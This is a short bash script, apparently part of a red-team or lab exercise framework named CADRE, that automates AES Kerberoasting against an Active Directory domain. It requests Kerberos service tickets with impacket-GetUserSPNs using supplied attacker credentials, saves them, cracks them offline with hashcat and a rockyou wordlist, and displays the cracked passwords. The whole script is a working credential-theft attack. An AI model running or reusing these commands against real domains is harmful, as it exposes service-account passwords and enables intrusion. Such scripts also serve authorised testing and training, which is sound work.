#!/bin/bash
# CADRE — WT#002 AES Kerberoasting
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#002 — AES Kerberoasting"
start_attack "002" "AES Kerberoasting"

require_tool impacket-GetUserSPNs
require_tool hashcat
require_env DC03 "DC03"
require_env ATTACK_USER "ATTACK_USER"
require_env ATTACK_PASS "ATTACK_PASS"
require_env DOMAIN_EXT "DOMAIN_EXT"

step "Step 1: Request AES-encrypted TGS for chief_command"
run_cmd "impacket-GetUserSPNs \"$DOMAIN_EXT/$ATTACK_USER:'$ATTACK_PASS'\" -dc-ip $DC03 -request -outputfile aes_tgs.txt"

step "Step 2: Verify TGS file was written"
run_cmd "ls -la aes_tgs.txt"

step "Step 3: Crack AES TGS hash with hashcat"
run_cmd "hashcat -m 19700 aes_tgs.txt /usr/share/wordlists/rockyou.txt --force"

step "Step 4: Show cracked credentials"
run_cmd "hashcat -m 19700 aes_tgs.txt --show"

result $? "AES Kerberoasting completed"
